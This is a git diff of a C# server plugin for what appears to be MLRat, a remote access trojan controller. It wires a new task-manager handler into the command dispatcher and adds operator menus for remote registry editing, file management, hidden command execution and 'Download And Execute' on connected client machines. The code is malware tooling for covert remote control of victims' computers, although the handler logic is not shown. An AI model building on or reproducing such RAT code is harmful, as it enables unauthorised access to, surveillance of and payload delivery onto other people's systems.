@@ -35,6 +35,7 @@ namespace MLManagementServer
             PingHandler.Disconnect(client);
             RegistryEditorHandler.Disconnect(client);
             FileExplorerHandler.Disconnect(client);
+            TaskManagerHandler.Disconnect(client);
         }
 
         public void OnDataRetrieved(IClient client, object[] data)
@@ -46,29 +47,48 @@ namespace MLManagementServer
             if (command == NetworkCommand.Pong) PingHandler.EndPing(client);
             if (command == NetworkCommand.RegistryEdit) RegistryEditorHandler.Handle(client, data);
             if (command == NetworkCommand.FileManager) FileExplorerHandler.Handle(client, data);
+            if (command == NetworkCommand.TaskManager) TaskManagerHandler.Handle(client, data);
         }
 
         public void OnPluginLoad(IServerUIHandler UIHost)
         {
             FileExplorerHandler.SetUIHost(UIHost);
-
+            TaskManagerHandler.SetUIHost(UIHost);
+            UIHost.Log("MLManagement loaded!", System.Drawing.Color.Green);
 
             PingHandler.Column = UIHost.AddColumn("Ping", "-");
-            MLRatContextEntry network = new MLRatContextEntry()
+            MLRatContextEntry management = new MLRatContextEntry()
             {
                 Text = "Management",
                 Icon = "management.png"
             };
 
-            network.SubMenus = new MLRatContextEntry[]
+            MLRatContextEntry network = new MLRatContextEntry()
             {
-                new MLRatContextEntry(){Text = "Ping", OnClick = PingHandler.ContextCallback, Icon="Antena.png"},
-                new MLRatContextEntry() {Text = "Registry Edit", OnClick = RegistryEditorHandler.ContextCallback, Icon="filestack.png" },
+                Text = "Network",
+                Icon = "network.png"
+            };
+
+            management.SubMenus = new MLRatContextEntry[]
+            {
+                new MLRatContextEntry() {Text = "Registry Edit", OnClick = RegistryEditorHandler.ContextCallback, Icon="registry.png" },
                 new MLRatContextEntry() { Text = "File Manager", OnClick = FileExplorerHandler.ContextCallback, Icon="folder.png" },
+                new MLRatContextEntry() { Text = "Task Manager", OnClick = TaskManagerHandler.ContextCallback, Icon="list.png" },
                 new MLRatContextEntry() { Text = "Close Client", OnClick = MiscHandler.CloseContextHandler, Icon="error.png" }
             };
 
-            UIHost.AddContext(network);
+            network.SubMenus = new MLRatContextEntry[]
+            {
+                new MLRatContextEntry(){Text = "Ping", OnClick = PingHandler.ContextCallback, Icon="Antena.png"},
+                new MLRatContextEntry(){Text = "Run", Icon="cog.png", SubMenus = new MLRatContextEntry[]{
+                    new MLRatContextEntry() {Text = "Normal", OnClick = MiscHandler.ExecuteContextHandler },
+                     new MLRatContextEntry() {Text = "Hidden", OnClick = MiscHandler.ExecuteHiddenContextHandler },
+                    } },
+                new MLRatContextEntry(){Text = "Download And Execute", OnClick = MiscHandler.DownloadAndExecuteContextHandler, Icon="globe.png"}
+
+            };
+
+            UIHost.AddContext(network, management);
         }
     }
 }
